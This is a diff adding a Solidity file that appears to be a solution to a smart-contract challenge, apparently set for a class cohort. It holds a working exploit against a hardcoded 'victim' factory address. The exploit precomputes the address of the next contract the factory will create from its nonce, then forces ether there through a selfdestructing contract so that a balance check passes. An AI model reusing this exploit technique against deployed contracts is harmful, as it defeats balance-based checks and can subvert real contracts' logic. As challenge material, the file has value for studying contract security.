@@ -1,0 +1,45 @@
+pragma solidity 0.4.24;
+
+contract Croesus {
+    constructor() public {
+        require(address(this).balance > 0);
+    }
+}
+
+contract CroesusFactory {
+    mapping (address => bool) public winners;
+    
+    event LogWon(address indexed sender, address indexed croesus, bytes32 braggingRights);
+
+    function tryToWin(bytes32 braggingRights) public {
+        winners[msg.sender] = true;
+        emit LogWon(msg.sender, address(new Croesus()), braggingRights);
+    }
+}
+
+contract MoneyBag {
+    constructor(address targetAddress) public payable {
+        selfdestruct(targetAddress);
+    }
+}
+
+contract PersianPyre {
+    CroesusFactory croesusFactory;
+
+    //The nonce is incremented everytime a new contrract is created by CroesusFactory;
+    //Another cohort had previously won the challenge, so my nonce is 2;
+    //*remember to send 1 wei:
+    constructor() public payable {
+        //victim's address: 0xc40557524257BEFF012C6D0806d2d98c738B9815
+        (new MoneyBag).value(msg.value)(fetchAddress(2));
+        
+        croesusFactory = CroesusFactory(0xc40557524257BEFF012C6D0806d2d98c738B9815);
+        croesusFactory.tryToWin("AYBABTU");
+    }
+    
+    //Remember: this will only work if nonce < 128;
+    //For 256 > nonce > 127: (0xd7, 0x94, address, 0x81, nonce) and so forth
+    function fetchAddress(uint8 nonce) public returns(address) {
+        return address(uint160(uint256(keccak256(abi.encodePacked(byte(0xd6), byte(0x94), 0xc40557524257BEFF012C6D0806d2d98c738B9815, byte(nonce))))));
+    } 
+}
